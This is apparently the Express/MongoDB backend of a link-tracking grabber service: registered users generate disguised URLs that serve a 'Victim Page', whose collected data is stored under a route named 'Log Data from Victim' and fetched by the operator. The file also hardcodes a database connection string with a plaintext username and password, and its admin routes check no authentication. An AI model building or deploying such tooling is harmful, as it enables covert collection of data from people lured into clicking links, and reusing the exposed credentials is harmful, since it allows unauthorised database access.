const express = require('express');
const mongoose = require('mongoose');
const crypto = require('crypto');
const axios = require('axios');
const path = require('path');
const app = express();

app.use(express.json());
app.use(express.static('public'));

const MONGO_URI = "mongodb+srv://darkgangdarks_db_user:aEEYR59YEVameS1y@cluster0.iyakwh0.mongodb.net/?appName=Cluster0";
mongoose.connect(MONGO_URI).then(() => console.log("MongoDB Connected"));

// Database Schemas
const userSchema = new mongoose.Schema({
    name: String,
    uid: String,
    isBanned: { type: Boolean, default: false }
});

const logSchema = new mongoose.Schema({
    uid: String,
    data: Object,
    timestamp: { type: Date, default: Date.now }
});

const customUrlSchema = new mongoose.Schema({
    slug: String,
    uid: String,
    redirect: String
});

const User = mongoose.model('User', userSchema);
const Log = mongoose.model('Log', logSchema);
const CustomUrl = mongoose.model('CustomUrl', customUrlSchema);

// --- Render Self-Mood Active Code ---
const SERVER_URL = "https://ipdx.onrender.com";
setInterval(() => {
    axios.get(`${SERVER_URL}/ping`).catch(() => {});
}, 300000); // 10 minutes

app.get('/ping', (req, res) => res.send("Active"));

// Registration (11-character ID)
app.post('/register', async (req, res) => {
    const uid = crypto.randomBytes(6).toString('hex').slice(0, 11);
    const newUser = new User({ name: req.body.name, uid: uid });
    await newUser.save();
    res.json({ name: req.body.name, uid: uid });
});

// Create URL
app.post('/create-url', async (req, res) => {
    const { uid, custom, slug, redirect } = req.body;
    const user = await User.findOne({ uid, isBanned: false });
    if (!user) return res.status(403).json({ error: "Banned/Invalid" });

    if (custom) {
        const newUrl = new CustomUrl({ slug, uid, redirect });
        await newUrl.save();
        res.json({ url: `${SERVER_URL}/v/${slug}` });
    } else {
        res.json({ url: `${SERVER_URL}/v/random-${uid}` });
    }
});

// Remove Custom URL on Exit
app.post('/remove-custom', async (req, res) => {
    await CustomUrl.deleteOne({ uid: req.body.uid });
    res.json({ status: "Removed" });
});

// Log Data from Victim
app.post('/log-data', async (req, res) => {
    const newLog = new Log({ uid: req.body.uid, data: req.body.info });
    await newLog.save();
    res.sendStatus(200);
});

// Get Logs for Bash Display
app.get('/get-logs/:uid', async (req, res) => {
    const logs = await Log.find({ uid: req.params.uid }).sort({ timestamp: -1 }).limit(1);
    res.json(logs);
});

// Serve Victim Page
app.get('/v/:slug', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Admin Routes
app.get('/admin/users', async (req, res) => res.json(await User.find()));
app.post('/admin/ban', async (req, res) => {
    await User.updateOne({ uid: req.body.uid }, { isBanned: true });
    res.json({ msg: "Banned" });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server: ${SERVER_URL}`));
